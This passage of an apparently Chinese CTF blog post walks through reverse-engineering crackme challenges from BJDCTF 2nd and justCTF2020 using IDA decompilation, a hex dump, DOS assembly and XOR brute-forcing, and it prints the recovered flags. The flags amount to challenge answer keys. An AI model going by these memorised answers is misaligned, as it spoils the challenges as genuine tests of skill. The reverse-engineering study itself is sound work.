= <span class="built_in">sub_7FF7D1F61172</span>(v6, <span class="string">&quot;ok,I am checking...&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, sub_7FF7D1F61127);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">j_strcmp</span>(Str1, <span class="string">&quot;cxx&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">sub_7FF7D1F61172</span>(std::cout, <span class="string">&quot;flag&#123;where_is_my_true_flag?&#125;&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, sub_7FF7D1F61127);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IDA打开 查看CPU_NUMBER的交叉引用 找到一个有for的xor<br>前面对CPU_NUMBER进行了处理<br>那么直接爆破得到v5(31604766)的值 再爆破得到CPU_NUMBER(123456)的值 最后xor回去即可<br>得到: flag{MD5(theNum)}<br>根据题目要求 没有大写 那么小写md5加密123456即可</p><h1 id="BJDCTF-2nd"><a href="#BJDCTF-2nd" class="headerlink" title="BJDCTF 2nd"></a>BJDCTF 2nd</h1><h2 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h2><p>IDA打开 字符串一搜就有<br><strong>S1mple_ReV3r5e_W1th_0D_0r_IDA</strong></p><h2 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h2><p>找到_ques地址 动调set Ip 跳转即可看到画出的字符<br><strong>HACKIT4FUN</strong></p><h2 id="8086"><a href="#8086" class="headerlink" title="8086"></a>8086</h2><p>莫名其妙的<br>十六进制编辑器看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> Offset    0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F   Ascii</span><br><span class="line"></span><br><span class="line">00000000  4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ?........</span><br><span class="line">00000010  00 00 00 00 1A 00 03 00 1E 00 00 00 01 00 1B 00  ...........</span><br><span class="line">00000020  03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ...............</span><br><span class="line">00000030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000040  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000060  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000070  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000080  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000090  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000000A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000000B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000000C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000000D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000000E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000000F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000100  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000110  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000120  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000130  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000140  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000150  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000160  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000170  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000180  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000190  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000001A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000001B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000001C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000001D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000001E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">000001F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000200  5D 55 5B 64 75 7E 7C 74 40 7B 7A 40 77 6A 2E 7D  ]U[du~|t@&#123;z@wj.&#125;</span><br><span class="line">00000210  2E 7E 71 40 67 6A 7A 7B 7A 40 77 7A 71 57 7E 2F  .~q@gjz&#123;z@wzqW~/</span><br><span class="line">00000220  62 3B 00 00 00 00 00 00 00 00 00 00 00 00 00 00  b;..............</span><br><span class="line">00000230  EB FE B9 22 00 8D 1E 00 00 8B F9 4F 80 31 1F E2  膻?.?..孂O€1?</span><br><span class="line">00000240  F8 8D 16 00 00 B4 09 CD 21 C3 B8 00 00 8E D8 E8  鴯..??酶..庁?</span><br><span class="line">00000250  DE FF B4 4C CD 21                                ?碙?</span><br></pre></td></tr></table></figure><p>只能说离谱 猜测</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">]U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b;</span><br></pre></td></tr></table></figure><p>这个应该跟某个key xor后就是flag<br>爆破一下 key&#x3D;31时得到flag<br><strong>BJD{jack_de_hu1b1an_xuede_henHa0}</strong></p><p>汇编学的真好呐</p><h1 id="justCTF2020"><a href="#justCTF2020" class="headerlink" title="justCTF2020"></a>justCTF2020</h1><h2 id="Rusty"><a href="#Rusty" class="headerlink" title="Rusty"></a>Rusty</h2><p>题目友情提示：<br><strong>Looking at Rust code in disassembler&#x2F;decompiler hurts, so… look somewhere else.</strong></p><p>但我还是拖到IDA里面了…<br>以下分析纯错误方向…</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> <span class="title">sub_7FF6B75D23E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  *(_OWORD *)v14 = *(_OWORD *)lpMem;</span><br><span class="line">  v15 = <span class="number">55</span>i64;</span><br><span class="line">  v6 = *(_QWORD *)lpMem;</span><br><span class="line">  <span class="keyword">if</span> ( **(_BYTE **)lpMem != <span class="string">&#x27;j&#x27;</span></span><br><span class="line">    || *((_BYTE *)v14[<span class="number">0</span>] + <span class="number">1</span>) != <span class="string">&#x27;c&#x27;</span></span><br><span class="line">    || *((_BYTE *)v14[<span class="number">0</span>] + <span class="number">2</span>) != <span class="string">&#x27;t&#x27;</span></span><br><span class="line">    || *((_BYTE *)v14[<span class="number">0</span>] + <span class="number">3</span>) != <span class="string">&#x27;f&#x27;</span></span><br><span class="line">    || *((_BYTE *)v14[<span class="number">0</span>] + <span class="number">4</span>) != <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">    || *((_BYTE *)v14[<span class="number">0</span>] + <span class="number">54</span>) != <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)v17 = &amp;off_7FF6B75F05D8;</span><br><span class="line">    *(_QWORD *)&amp;v17[<span class="number">8</span>] = <span class="number">1</span>i64;</span><br><span class="line">    *(_QWORD *)&amp;v17[<span class="number">16</span>] = <span class="number">0</span>i64;</span><br><span class="line">    v18 = <span class="string">&quot;Are you sure??? Try somewhere else.\n&quot;</span>;</span><br><span class="line">    v19 = <span class="number">0</span>i64;</span><br><span class="line">    result = <span class="built_in">sub_7FF6B75D8690</span>((__int128 *)v17);</span><br><span class="line">    <span class="keyword">if</span> ( !v14[<span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = <span class="built_in">sub_7FF6B75D2A30</span>(<span class="number">0x64</span>ui64);</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">    <span class="built_in">sub_7FF6B75E8830</span>();</span><br><span class="line">  v8 = (<span class="type">void</span> *)v7;</span><br><span class="line">  *(_OWORD *)v7 = xmmword_7FF6B75F0460;</span><br><span class="line">  *(_OWORD *)(v7 + <span class="number">16</span>) = xmmword_7FF6B75F0470;</span><br><span class="line">  *(_OWORD *)(v7 + <span class="number">32</span>) = xmmword_7FF6B75F0480;</span><br><span class="line">  *(_OWORD *)(v7 + <span class="number">48</span>) = xmmword_7FF6B75F0490;</span><br><span class="line">  *(_OWORD *)(v7 + <span class="number">64</span>) = xmmword_7FF6B75F04A0;</span><br><span class="line">  *(_OWORD *)(v7 + <span class="number">80</span>) = xmmword_7FF6B75F04B0;</span><br><span class="line">  *(_DWORD *)(v7 + <span class="number">96</span>) = <span class="number">0x14A0108</span>;</span><br><span class="line">  *(_QWORD *)v13 = v7;</span><br><span class="line">  *(_OWORD *)&amp;v13[<span class="number">8</span>] = xmmword_7FF6B75F04C0;</span><br><span class="line">  v9 = <span class="number">7</span>i64;</span><br><span class="line">  <span class="keyword">while</span> ( v9 != <span class="number">57</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = *(<span class="type">unsigned</span> __int8 *)(v6 + (v9 - <span class="number">2</span>) % <span class="number">55</span>)<span class="comment">// v6: input!</span></span><br><span class="line">        + (<span class="type">unsigned</span> __int16)*(<span class="type">unsigned</span> __int8 *)(v6 + (v9 - <span class="number">1</span>) % <span class="number">55</span>)</span><br><span class="line">        + *(<span class="type">unsigned</span> __int8 *)(v6 + v9 % <span class="number">55</span>) == *(_WORD *)(v7 + <span class="number">2</span> * v9 - <span class="number">14</span>);</span><br><span class="line">    ++v9;</span><br><span class="line">    <span class="keyword">if</span> ( !v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)v17 = &amp;off_7FF6B75F05D8;</span><br><span class="line">      *(_QWORD *)&amp;v17[<span class="number">8</span>] = <span class="number">1</span>i64;</span><br><span class="line">      *(_QWORD *)&amp;v17[<span class="number">16</span>] = <span class="number">0</span>i64;</span><br><span class="line">      v18 = <span class="string">&quot;Are you sure??? Try somewhere else.\n&quot;</span>;</span><br><span class="line">      v19 = <span class="number">0</span>i64;</span><br><span class="line">      <span class="built_in">sub_7FF6B75D8690</span>((__int128 *)v17);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)v17 = &amp;off_7FF6B75F0610;</span><br><span class="line">  *(_QWORD *)&amp;v17[<span class="number">8</span>] = <span class="number">1</span>i64;</span><br><span class="line">  *(_QWORD *)&amp;v17[<span class="number">16</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v18 = <span class="string">&quot;Are you sure??? Try somewhere else.\n&quot;</span>;</span><br><span class="line">  v19 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">sub_7FF6B75D8690</span>((__int128 *)v17);</span><br><span class="line">LABEL_29:</span><br><span class="line">  result = <span class="built_in">sub_7FF6B75D2A40</span>(v8);</span><br><span class="line">  <span class="keyword">if</span> ( v14[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_25:</span><br><span class="line">    v12 = v14[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sub_7FF6B75D2A40</span>(v12);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里大致能看到 “flag”  的check<br>甚至z3还可以约束求解出 “flag”<br>但是解出来很奇怪<br>类似这种奇怪字符串</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgjs^JS^oos`tgf_&#123;?_xpu^brd`lnpkhog^<span class="number">5</span>_EBKDGL@H! <span class="string">&quot;!|kc2k</span></span><br></pre></td></tr></table></figure><p>很明显这是一条完全错误的道路<br>注意到这个文件的DOS头超大<br>一般的PE文件Nt的偏移也就F0左右 这个PE达到了1150！<br>提取出来写入文件 IDA打开 没办法F5 硬怼汇编<br>还好IDA识别出了很多重要的特征</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">seg000:<span class="number">008</span>A                 <span class="keyword">public</span> start</span><br><span class="line">seg000:<span class="number">008</span>A start           proc near</span><br><span class="line">seg000:<span class="number">008</span>A                 cld</span><br><span class="line">seg000:<span class="number">008B</span>                 call    sub_102C7</span><br><span class="line">seg000:<span class="number">008</span>E                 mov     ax, <span class="number">13</span>h</span><br><span class="line">seg000:<span class="number">0091</span>                 <span class="type">int</span>     <span class="number">10</span>h             ; - VIDEO - SET VIDEO MODE</span><br><span class="line">seg000:<span class="number">0091</span>                                         ; AL = mode</span><br><span class="line">seg000:<span class="number">0093</span>                 call    sub_101FF</span><br><span class="line">seg000:<span class="number">0096</span>                 mov     ax, <span class="number">0</span>A000h</span><br><span class="line">seg000:<span class="number">0099</span>                 mov     es, ax</span><br><span class="line">seg000:<span class="number">009B</span>                 assume es:nothing</span><br><span class="line">seg000:<span class="number">009B</span></span><br><span class="line">seg000:<span class="number">009B</span> loc_1009B:                              ; CODE XREF: start+<span class="number">2</span>A↓j</span><br><span class="line">seg000:<span class="number">009B</span>                                         ; start+<span class="number">4</span>A↓j ...</span><br><span class="line">seg000:<span class="number">009B</span>                 call    sub_101C7</span><br><span class="line">seg000:<span class="number">009</span>E                 call    sub_101B5</span><br><span class="line">seg000:<span class="number">00</span>A1                 call    sub_1026A</span><br><span class="line">seg000:<span class="number">00</span>A4                 call    sub_1017A</span><br><span class="line">seg000:<span class="number">00</span>A7                 lea     di, ds:<span class="number">30</span>h</span><br><span class="line">seg000:<span class="number">00</span>AB                 mov     word ptr cs:[di], <span class="number">0</span></span><br><span class="line">seg000:<span class="number">00B</span>0                 mov     ah, <span class="number">1</span></span><br><span class="line">seg000:<span class="number">00B</span>2                 <span class="type">int</span>     <span class="number">16</span>h             ; KEYBOARD - CHECK BUFFER, DO NOT CLEAR</span><br><span class="line">seg000:<span class="number">00B</span>2                                         ; Return: ZF clear <span class="keyword">if</span> character in buffer</span><br><span class="line">seg000:<span class="number">00B</span>2                                         ; AH = scan code, AL = character</span><br><span class="line">seg000:<span class="number">00B</span>2                                         ; ZF set <span class="keyword">if</span> no character in buffer</span><br><span class="line">seg000:<span class="number">00B</span>4                 jz      <span class="type">short</span> loc_1009B</span><br><span class="line">seg000:<span class="number">00B</span>6                 mov     ah, <span class="number">0</span></span><br><span class="line">seg000:<span class="number">00B</span>8                 <span class="type">int</span>     <span class="number">16</span>h             ; KEYBOARD - READ CHAR FROM BUFFER, WAIT IF EMPTY</span><br><span class="line">seg000:<span class="number">00B</span>8                                         ; Return: AH = scan code, AL = character</span><br><span class="line">seg000:<span class="number">00B</span>A                 lea     di, ds:<span class="number">60</span>h</span><br><span class="line">seg000:<span class="number">00B</span>E                 cmp     al, <span class="number">1B</span>h</span><br><span class="line">seg000:<span class="number">00</span>C0                 jz      <span class="type">short</span> loc_10134</span><br><span class="line">seg000:<span class="number">00</span>C2                 cmp     al, <span class="number">0</span>Dh</span><br><span class="line">seg000:<span class="number">00</span>C4                 jz      <span class="type">short</span> loc_10107</span><br><span class="line">seg000:<span class="number">00</span>C6                 cmp     al, <span class="number">8</span></span><br><span class="line">seg000:<span class="number">00</span>C8                 jz      <span class="type">short</span> loc_100EE</span><br><span class="line">seg000:<span class="number">00</span>CA                 mov     bx, cs:word_10032</span><br><span class="line">seg000:<span class="number">00</span>CF                 cmp     bl, byte ptr cs:word_10088</span><br><span class="line">seg000:<span class="number">00</span>D4                 jnb     <span class="type">short</span> loc_1009B</span><br><span class="line">seg000:<span class="number">00</span>D6                 add     di, cs:word_10032</span><br><span class="line">seg000:<span class="number">00</span>DB                 mov     cs:[di], al</span><br><span class="line">seg000:<span class="number">00</span>DE                 inc     cs:word_10032</span><br><span class="line">seg000:<span class="number">00E3</span>                 lea     di, ds:<span class="number">30</span>h</span><br><span class="line">seg000:<span class="number">00E7</span>                 mov     word ptr cs:[di], <span class="number">2</span>Ah ; <span class="string">&#x27;*&#x27;</span></span><br><span class="line">seg000:<span class="number">00</span>EC                 jmp     <span class="type">short</span> loc_1009B</span><br><span class="line">seg000:<span class="number">00</span>EE ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:<span class="number">00</span>EE</span><br><span class="line">seg000:<span class="number">00</span>EE loc_100EE:                              ; CODE XREF: start+<span class="number">3</span>E↑j</span><br><span class="line">seg000:<span class="number">00</span>EE                 cmp     cs:word_10032, <span class="number">0</span></span><br><span class="line">seg000:<span class="number">00F</span>4                 jbe     <span class="type">short</span> loc_1009B</span><br><span class="line">seg000:<span class="number">00F</span>6                 dec     cs:word_10032</span><br><span class="line">seg000:<span class="number">00F</span>B                 add     di, cs:word_10032</span><br><span class="line">seg000:<span class="number">0100</span>                 mov     word ptr cs:[di], <span class="number">0</span></span><br><span class="line">seg000:<span class="number">0105</span>                 jmp     <span class="type">short</span> loc_1009B</span><br><span class="line">seg000:<span class="number">0107</span> ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:<span class="number">0107</span></span><br><span class="line">seg000:<span class="number">0107</span> loc_10107:                              ; CODE XREF: start+<span class="number">3</span>A↑j</span><br><span class="line">seg000:<span class="number">0107</span>                 <span class="keyword">xor</span>     bx, bx</span><br><span class="line">seg000:<span class="number">0109</span>                 push    cs</span><br><span class="line">seg000:<span class="number">010</span>A                 pop     ds</span><br><span class="line">seg000:<span class="number">010B</span>                 assume ds:seg000</span><br><span class="line">seg000:<span class="number">010B</span>                 mov     si, <span class="number">60</span>h ; <span class="string">&#x27;`&#x27;</span></span><br><span class="line">seg000:<span class="number">010</span>E                 push    cs</span><br><span class="line">seg000:<span class="number">010F</span>                 pop     es</span><br><span class="line">seg000:<span class="number">0110</span>                 assume es:seg000</span><br><span class="line">seg000:<span class="number">0110</span>                 mov     cx, cs:word_10088</span><br><span class="line">seg000:<span class="number">0115</span></span><br><span class="line">seg000:<span class="number">0115</span> loc_10115:                              ; CODE XREF: start+A8↓j</span><br><span class="line">seg000:<span class="number">0115</span>                 mov     di, <span class="number">34</span>h ; <span class="string">&#x27;4&#x27;</span></span><br><span class="line">seg000:<span class="number">0118</span>                 push    cx</span><br><span class="line">seg000:<span class="number">0119</span>                 add     di, bx</span><br><span class="line">seg000:<span class="number">011B</span>                 mov     cx, cs:word_10088</span><br><span class="line">seg000:<span class="number">0120</span>                 sub     cx, bx</span><br><span class="line">seg000:<span class="number">0122</span></span><br><span class="line">seg000:<span class="number">0122</span> loc_10122:                              ; CODE XREF: start+A3↓j</span><br><span class="line">seg000:<span class="number">0122</span>                 mov     al, [si]</span><br><span class="line">seg000:<span class="number">0124</span>                 mov     ah, es:[di]</span><br><span class="line">seg000:<span class="number">0127</span>                 <span class="keyword">xor</span>     al, ah</span><br><span class="line">seg000:<span class="number">0129</span>                 mov     es:[di], al</span><br><span class="line">seg000:<span class="number">012</span>C                 inc     di</span><br><span class="line">seg000:<span class="number">012</span>D                 loop    loc_10122</span><br><span class="line">seg000:<span class="number">012F</span>                 pop     cx</span><br><span class="line">seg000:<span class="number">0130</span>                 inc     si</span><br><span class="line">seg000:<span class="number">0131</span>                 inc     bx</span><br><span class="line">seg000:<span class="number">0132</span>                 loop    loc_10115</span><br><span class="line">seg000:<span class="number">0134</span></span><br><span class="line">seg000:<span class="number">0134</span> loc_10134:                              ; CODE XREF: start+<span class="number">36</span>↑j</span><br><span class="line">seg000:<span class="number">0134</span>                 mov     ax, <span class="number">3</span></span><br><span class="line">seg000:<span class="number">0137</span>                 <span class="type">int</span>     <span class="number">10</span>h             ; - VIDEO - SET VIDEO MODE</span><br><span class="line">seg000:<span class="number">0137</span>                                         ; AL = mode</span><br><span class="line">seg000:<span class="number">0139</span>                 mov     dx, <span class="number">0</span></span><br><span class="line">seg000:<span class="number">013</span>C                 push    cs</span><br><span class="line">seg000:<span class="number">013</span>D                 pop     ds</span><br><span class="line">seg000:<span class="number">013</span>E                 mov     si, <span class="number">60</span>h ; <span class="string">&#x27;`&#x27;</span></span><br><span class="line">seg000:<span class="number">0141</span>                 mov     cx, cs:word_10088</span><br><span class="line">seg000:<span class="number">0146</span>                 <span class="keyword">xor</span>     bx, bx</span><br><span class="line">seg000:<span class="number">0148</span>                 <span class="keyword">xor</span>     ah, ah</span><br><span class="line">seg000:<span class="number">014</span>A</span><br><span class="line">seg000:<span class="number">014</span>A loc_1014A:                              ; CODE XREF: start+C3↓j</span><br><span class="line">seg000:<span class="number">014</span>A                 lodsb</span><br><span class="line">seg000:<span class="number">014B</span>                 add     bx, ax</span><br><span class="line">seg000:<span class="number">014</span>D                 loop    loc_1014A</span><br><span class="line">seg000:<span class="number">014F</span>                 cmp     bx, cs:word_1005E</span><br><span class="line">seg000:<span class="number">0154</span>                 jnz     <span class="type">short</span> loc_10171</span><br><span class="line">seg000:<span class="number">0156</span>                 mov     si, <span class="number">34</span>h ; <span class="string">&#x27;4&#x27;</span></span><br><span class="line">seg000:<span class="number">0159</span>                 mov     cx, cs:word_10088</span><br><span class="line">seg000:<span class="number">015</span>E                 <span class="keyword">xor</span>     bx, bx</span><br><span class="line">seg000:<span class="number">0160</span>                 <span class="keyword">xor</span>     ah, ah</span><br><span class="line">seg000:<span class="number">0162</span></span><br><span class="line">seg000:<span class="number">0162</span> loc_10162:                              ; CODE XREF: start+DB↓j</span><br><span class="line">seg000:<span class="number">0162</span>                 lodsb</span><br><span class="line">seg000:<span class="number">0163</span>                 add     bx, ax</span><br><span class="line">seg000:<span class="number">0165</span>                 loop    loc_10162</span><br><span class="line">seg000:<span class="number">0167</span>                 cmp     bx, cs:word_1005C</span><br><span class="line">seg000:<span class="number">016</span>C                 jnz     <span class="type">short</span> loc_10171</span><br><span class="line">seg000:<span class="number">016</span>E                 mov     dx, <span class="number">34</span>h ; <span class="string">&#x27;4&#x27;</span></span><br><span class="line">seg000:<span class="number">0171</span></span><br><span class="line">seg000:<span class="number">0171</span> loc_10171:                              ; CODE XREF: start+CA↑j</span><br><span class="line">seg000:<span class="number">0171</span>                                         ; start+E2↑j</span><br><span class="line">seg000:<span class="number">0171</span>                 mov     ah, <span class="number">9</span></span><br><span class="line">seg000:<span class="number">0173</span>                 <span class="type">int</span>     <span class="number">21</span>h             ; DOS - PRINT STRING</span><br><span class="line">seg000:<span class="number">0173</span>                                         ; DS:DX -&gt; string terminated by <span class="string">&quot;$&quot;</span></span><br><span class="line">seg000:<span class="number">0175</span>                 mov     ax, <span class="number">4</span>C00h</span><br><span class="line">seg000:<span class="number">0178</span>                 <span class="type">int</span>     <span class="number">21</span>h             ; DOS - <span class="number">2</span>+ - <span class="function">QUIT WITH EXIT <span class="title">CODE</span> <span class="params">(EXIT)</span></span></span><br><span class="line"><span class="function">seg000:<span class="number">0178</span> start           endp                    ;</span> AL = exit code</span><br></pre></td></tr></table></figure><p>注意到这里有两个check</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">seg000:<span class="number">014</span>A                 lodsb</span><br><span class="line">seg000:<span class="number">014B</span>                 add     